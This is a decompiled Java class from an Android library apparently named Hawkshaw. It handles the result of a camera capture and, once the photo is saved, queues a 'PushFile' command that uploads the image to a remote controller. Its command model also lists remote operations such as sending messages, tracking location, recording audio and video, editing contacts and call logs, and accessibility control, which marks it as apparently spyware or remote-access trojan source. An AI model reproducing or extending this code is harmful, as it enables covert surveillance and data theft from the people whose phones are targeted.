package com.hawkshaw.library.features.media.camera;

import A.d;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.net.Uri;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import j3.f;
import java.io.File;
import java.util.concurrent.ExecutorService;
import o.C0753H;
import o.C0756K;
import o.C0758M;
import s.C0938g;
import t3.N;

public final class TakePictureKt$takePicture$imageSavedCallback$1 implements C0753H {
    final /* synthetic */ ExecutorService $cameraExecutor;
    final /* synthetic */ d $cameraProvider;
    final /* synthetic */ File $outputFile;

    public TakePictureKt$takePicture$imageSavedCallback$1(File file, ExecutorService executorService, d dVar) {
        this.$outputFile = file;
        this.$cameraExecutor = executorService;
        this.$cameraProvider = dVar;
    }

    public void onError(C0758M m4) {
        K.n(m4, "exception");
        TakePictureKt.takePicture$releaseResources(this.$cameraExecutor, this.$cameraProvider);
        Logger.e$default(Logger.INSTANCE, "CameraXPicture", C0528x.h("Take picture failed, ", m4.getMessage()), (Exception) null, false, 12, (Object) null);
    }

    public void onImageSaved(C0756K k5) {
        C0756K k6 = k5;
        K.n(k6, "outputFileResults");
        Logger logger = Logger.INSTANCE;
        StringBuilder sb = new StringBuilder("Take picture, success Uri: ");
        Uri uri = k6.f7910a;
        sb.append(uri);
        Logger.d$default(logger, "CameraXPicture", sb.toString(), false, 4, (Object) null);
        TakePictureKt.takePicture$releaseResources(this.$cameraExecutor, this.$cameraProvider);
        if (uri == null) {
            uri = Uri.fromFile(this.$outputFile);
        }
        Command.FileRequest fileRequest = r2;
        K.k(uri);
        String path = C0938g.t(uri).getPath();
        K.m(path, "getPath(...)");
        Command.FileRequest fileRequest2 = new Command.FileRequest(path, Command.FileRequest.Source.CameraImage, (Command.FileRequest.Medium) null, 0, false, 28, (f) null);
        CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new i(new Command(Command.CommandType.PushFile, 0, (Command.ThumbnailRequest) null, fileRequest, (Command.FilesRequest) null, (Command.DeletePendingPushFilesRequest) null, (Command.DeleteFileRequest) null, (Command.AddCallLogRequest) null, (Command.DeleteCallLogRequest) null, (Command.AddContactRequest) null, (Command.DeleteContactRequest) null, (Command.SendMessageRequest) null, (Command.GetLocationRequest) null, (Command.VibrateRequest) null, (Command.FlashRequest) null, (Command.TakePictureRequest) null, (Command.RecordVideoRequest) null, (Command.RecordAudioRequest) null, (Command.PushDeviceInfoRequest) null, (Command.OpenAppRequest) null, (Command.MakeCallRequest) null, (Command.DeviceAudioRequest) null, (Command.OpenDeeplinkRequest) null, (Command.LoginRequest) null, (Command.ScheduleCommandRequest) null, (Command.CancelScheduledCommandRequest) null, (Command.AccessibilityCommandRequest) null, (Command.StartRepeatPushDataRequest) null, (Command.SetDynamicConfigRequest) null, (Command.SyncAppConfigRequest) null, 1073741812, (f) null), (e) null), 1, (Object) null);
    }
}
